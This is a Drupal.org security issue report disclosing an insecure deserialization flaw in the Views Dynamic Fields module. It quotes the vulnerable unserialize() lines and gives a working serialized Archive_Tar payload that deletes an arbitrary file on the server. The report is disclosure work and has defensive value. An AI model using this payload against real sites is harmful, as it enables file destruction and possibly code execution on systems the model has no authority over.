=== Content from www.drupal.org_1d1482ac_20250202_144859.html ===

[Skip to main content](#content)
[Skip to search](#search-block-form)

Can we use first and third party cookies and web beacons to [understand our audience, and to tailor promotions you see](https://www.drupal.org/terms)?
Yes, pleaseNo, do not track me
[![Main menu](/sites/all/themes/bluecheese/images/icon-w-menu.svg)](#block-system-main-menu)

* [Drupal.org home](/home "Drupal.org home page")
* [Platform](/about/overview/technical)
  + [Drupal Core](/about/overview/technical "The foundation of every Drupal experience")
  + [Drupal CMS](https://new.drupal.org/drupal-cms "Launch your Drupal project quickly and intuitively")
  + [Drupal 11](/about/11 "Get started with the lastest version of Drupal here")
* [Solutions](/case-studies "Examples of solutions built on Drupal")
  + [Case studies](/case-studies "Powerful stories that show Drupal solutions in the real world")
  + [Fintech](/industries/fintech "Secure and trustworthy fintech infrastructure")
  + [Education](/industries/education "Higher education stories from around the world")
  + [Retail](/industries/retail "Integrated retail systems, powered by Drupal")
  + [E-commerce](/industries/ecommerce "Tight integration between content and commerce")
  + [Healthcare](/industries/healthcare "Systems that are secure, patient-centric, and engaging")
  + [High Tech](/industries/hightech "Platforms to enable high tech industry leaders")
  + [Nonprofit](/industries/nonprofit "Content power tools for global changemakers ")
  + [Government](/industries/government "Multi-site scaling for maximal citizen engagement")
  + [Travel](/industries/travel "Mobile and multilingual traveler engagement")
  + [Decoupled](/features/decoupled "How decoupled Drupal powers content across channels")
* [Develop](/docs/official_docs/local-development-guide "Guide to installing Drupal locally with Docker and DDEV")
  + [Local Development Guide](/docs/official_docs/local-development-guide "Guide to installing Drupal locally with Docker and DDEV")
  + [Drupal user guide](/docs/user_guide/en/index.html "Step-by-step guide for learning Drupal")
  + [Installing Drupal](/docs/getting-started/installing-drupal "Guide to installing Drupal on a server")
  + [API reference](https://api.drupal.org "Complete documentation of Drupal Core APIs")
  + [All Documentation](/documentation "Full knowledge base including Drupal 7 resources")
* [Download](/download " Download Drupal and the extensions you need")
  + [Download](/download " Download Drupal and the extensions you need")
  + [Modules](/project/modules "Extend your project's functionality")
  + [Themes](/project/themes "Change your project's look and feel")
  + [Distributions](/project/distributions "Jumpstart your project with a pre-configured install")
  + [Issue queues](/project/issues "Report issues and contribute improvements")
* [Get Support](/support "Get support for your Drupal project")
  + [Drupal user guide](/docs/user_guide/en/index.html " Learn to build with Drupal")
  + [Training](/training "Upskill your Drupal team")
  + [Drupal Slack](/community/contributor-guide/reference-information/talk/tools/slack "Get support and collaborate with the community ")
  + [Find an Agency Partner](/drupal-services "Search Certified Partners to accelerate your project")
  + [Find a Migration partner](/about/drupal-7/d7eol/migration-resource-center/enterprise "Get help with your migration to the latest version")
  + [Find Integrations & Hosting](/hosting "Find providers for third-party integrations and hosting")
  + [Security Advisories](/security "Stay on top of the latest security alerts and updates")
* [Connect](/community "Connect with the Drupal community")
  + [About the Community](/community " Come for the code, stay for the community")
  + [Community Events](/community/events "Discover local events, meet-ups, and training")
  + [Jobs/Careers](https://jobs.drupal.org "Find opportunities to work in Drupal")
  + [DrupalCon](https://events.drupal.org "Gather together with experts from around the world")
  + [How to Contribute](/community/contributor-guide "Get involved in growing and evolving Drupal")
  + [Drupal in the News](/about/in-the-news "Keep up-to-date on the latest Drupal announcements")
  + [Sign up for Drupal News](/subscribe "Get product updates and community news")
* [Support Drupal](/association "Support the Drupal Association - the non-profit that supports the Drupal project")
  + [The Drupal Association](/association "Meet the non-profit accelerating Drupal innovation ")
  + [Donate](/association/donate "Donate to the non-profit that supports Drupal")
  + [Become a Partner](/association/become-a-drupal-certified-partner "Join the network of official Drupal Certified Partners")
  + [Become a Ripple Maker](/association/RippleMakers "Become an individual member of the Drupal Association")
  + [Become an Organization Member](/association/organization-membership "Join and show your organization's support for Drupal")
  + [Drupal Swag Shop](https://www.drupal.org/swag?utm_source=drupalorg&utm_medium=banner&utm_campaign=drupal_swag_shop_2020_09_17 "Get your Drupal-branded bucket hats, hoodies, and more")
* [Get Started](/try-drupal "Try Drupal")
  + [Demo online](/try-drupal "Demo Drupal online with a Drupal platform partner")
  + [Download](/download)
[Return to content](#top)

## Search form

Search

* [![Log in, view profile, and more](https://www.drupal.org/sites/all/themes/bluecheese/images/icon-w-user.svg)](#block-system-user-menu)
  + [Log in](/user/login?destination=node/3056600)
  + [Create account](/user/register?destination=node/3056600)

[![Drupal.org](https://www.drupal.org/files/drupal-wordmark.svg)](/ "Drupal.org")

![Announcement icon](https://www.drupal.org/files/styles/grid-2-2x-square/public/announcements/drupal-evergreen-logo-280X280px%20%281%29_0.jpg?itok=PHpn6rCb "Announcement icon")
[Migration Resource Center](https://www.drupal.org/about/drupal-7/d7eol/migration-resource-center/enterprise)

[Modules](/project/project_module)[Views Dynamic Fields](/project/views_dynamic_fields)[Issues](/project/issues/views_dynamic_fields)
# Drupal module - Views Dynamic Fields - insecure deserialization

ActiveProject: Views Dynamic FieldsVersion: 7.x-1.x-devComponent: CodePriority: CriticalCategory: Bug reportAssigned: UnassignedIssue tags: [Security](/project/issues/search?issue_tags=Security "It is used for security vulnerabilities which do not need a security advisory. For example, security issues in projects which do not have security advisory coverage, or forward-porting a change already disclosed in a security advisory. See Drupal’s security advisory policy for details.
Be careful publicly disclosing security vulnerabilities! Use the “Report a security vulnerability” link in the project page’s sidebar. See how to report a security issue for details.

Click “about tags” for links") about tagsSecurity

It is used for security vulnerabilities which *do not need a security advisory*. For example, security issues in projects which do not have security advisory coverage, or forward-porting a change already disclosed in a security advisory. See Drupal’s [security advisory policy](https://www.drupal.org/security-advisory-policy) for details.

Reporter: [br0x](/u/br0x "View user profile.") Created: 23 May 2019 at 11:21 UTCUpdated: 23 May 2019 at 17:28 UTC
Jump to comment: [Most recent](/project/views_dynamic_fields/issues/3056600#comment-13117919)

Note: The description will be also posted on fulldisclosure mailing list.

Drupal module - Views Dynamic Fields - insecure deserialization

═════════════════════════════════════════════════════════════════

Product: Views Dynamic Fields

Version: <=7.x-1.0-alpha4

URL: [[https://www.drupal.org/project/views\_dynamic\_fields]](https://www.drupal.org/project/views_dynamic_fields%5D)

CVSS v3: 8.1 (AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H)

Drupal module "Views Dynamic Fields" which allows for dynamic

specification of fields to be presented in a view allows a remote

attacker to inject arbitrary PHP object which will be further

serialized. The vulnerable code is in file :

┌────

│ $ grep -C3 -n 'unserialize' handlers/views\_handler\_filter\_dynamic\_fields.inc

│

│ 278- = $exposed\_input[$this->options['expose']['identifier']];

│ 279- $exposed\_field\_names

│ 280- = isset($exposed\_input['field\_names'])

│ 281: ? unserialize($exposed\_input['field\_names']) : $field\_names;

│ 282- }

│ 283- $this->options['expose']['multiple'] = $this->options['checkboxes'];

│ 284-

│ --

│ 480-

│ 481- // Exclude these fields.

│ 482- $combined\_fields = isset($exposed\_input['combined'])

│ 483: ? unserialize($exposed\_input['combined']) : array();

│ 484- if (!$this->options['checkboxes']) {

│ 485- $this

│ 486- ->pre\_query\_single($exposed\_input, $field\_names, $combined\_fields);

│ --

│ 564-

│ 565- // Fields displayed in the filter.

│ 566- $form\_field\_names = isset($exposed\_input['field\_names'])

│ 567: ? unserialize($exposed\_input['field\_names']) : $field\_names;

│ 568- $orig\_field\_exposed = $order\_includes = $order\_excludes = array();

│ 569- foreach ($exposed\_input\_fields as $id => $info) {

│ 570- $orig\_field\_exposed[$info['sort']] = $form\_field\_names[$id];

└────

This can further lead to arbitrary attack vectors. A Proof of Concept

is to add to the field\_names object an instance of Archive\_Tar drupal

object which deletes any file on the server pointed by its

\_temp\_tarname field. The used Drupal's Archive\_Tar code:

┌────

│ public function \_\_destruct()

│ {

│ $this->\_close();

│ // ----- Look for a local copy to delete

│ if ($this->\_temp\_tarname != '') {

│ @drupal\_unlink($this->\_temp\_tarname);

│ }

│ }

└────

Thus pushing into the filed\_names POST array variable an object of

Archive\_Tar type allows to trigger arbitrary file deletion. For

example following value of field\_names:

┌────

│ a:1:{i:0;O:11:"Archive\_Tar":1:{s:13:"\_temp\_tarname";s:9:"/tmp/test";}}

└────

Deletes the /tmp/test file on server.

Depending on the amout of different classes loaded this could be

further exploited in many ways, in special cases even to code

execution.

## Comments

###

### [Comment #1](/project/views_dynamic_fields/issues/3056600#comment-13117919)

23 May 2019 at 11:21

[br0x](/u/br0x "View user profile.") created an issue.

* [Log in](/user/login?destination=comment/reply/3056600%23comment-form) or [register](/user/register?destination=comment/reply/3056600%23comment-form) to post comments

[Add child issue](/node/add/project-issue/views_dynamic_fields?field_issue_parent=3056600), [clone issue](/node/add/project-issue/views_dynamic_fields?title=Drupal%20module%20-%20Views%20Dynamic%20Fields%20-%20insecure%20deserialization&field_issue_parent=3056600&clone_body=1&categories=1&priorities=400&status=1&version=7.x-1.x-dev&component=Code&assigned=0&tags=Security)

[Infrastructure management for Drupal.org provided by ![Tag1 logo](/files/cta/graphic/tag1_wht.svg)](https://bit.ly/4fYoEf8)

[Need a Drupal 7 extended support partner? Consider Tag1.](https://bit.ly/41bS4lA)

#### News items

* [News](https://www.drupal.org/news)
* [Planet Drupal](https://www.drupal.org/planet "News from Drupal community members")
* [Social media](https://www.drupal.org/about/media-kit/social-media "Drupal on social media")
* [Sign up for Drupal news](https://www.drupal.org/subscribe)
* [Security advisories](https://www.drupal.org/security "Announcements from the Drupal Security Team")
* [Jobs](https://jobs.drupal.org/ "Drupal Jobs")

#### Our community

* [Community](https://www.drupal.org/community)
* [Services](https://www.drupal.org/drupal-services "People and organizations offering Drupal services"), [Training](https://www.drupal.org/training "People and organizations offering Drupal training") & [Hosting](https://www.drupal.org/hosting "Organizations offering Drupal hosting")
* [Contributor guide](https://www.drupal.org/community/contributor-guide)
* [Groups & meetups](https://groups.drupal.org/groups "groups.drupal.org")
* [DrupalCon](https://events.drupal.org "Upcoming and past DrupalCons")
* [Code of conduct](https://www.drupal.org/dcoc "Drupal code of conduct")

#### Documentation

* [Documentation](https://www.drupal.org/documentation "Documentation for working with Drupal")
* [Drupal Guide](https://www.drupal.org/docs)
* [Drupal User Guide](https://www.drupal.org/docs/user_guide/en/index.html)
* [Developer docs](https://www.drupal.org/documentation/develop)
* [API.Drupal.org](https://api.drupal.org/ "Drupal API reference")

#### Drupal code base

* [Download & Extend](https://www.drupal.org/download)
* [Drupal core](https://www.drupal.org/project/drupal "Download the latest version of the Drupal software")
* [Modules](https://www.drupal.org/project/project_module "Download add-on features and functionality")
* [Themes](https://www.drupal.org/project/project_theme "Download pre-designed styles for Drupal")
* [Distributions](https://www.drupal.org/project/project_distribution "Download a pre-packaged Drupal site")

#### Governance of community

* [About](https://www.drupal.org/about)
* [Web accessibility](https://www.drupal.org/about/features/accessibility "Our committment to accessibility")
* [Drupal Association](https://www.drupal.org/association "About the Drupal Association")
* [About Drupal.org](https://www.drupal.org/drupalorg "About Drupal.org")
* [Terms of service](https://www.drupal.org/terms "Drupal.org terms of service")
* [Privacy policy](https://www.drupal.org/privacy "Drupal.org privacy policy")

Drupal is a [registered trademark](/about/trademark) of [Dries Buytaert](https://dri.es).

![](/VnPBBfwe/xhr/api/v1/collector/noScript.gif?appId=PXVnPBBfwe)


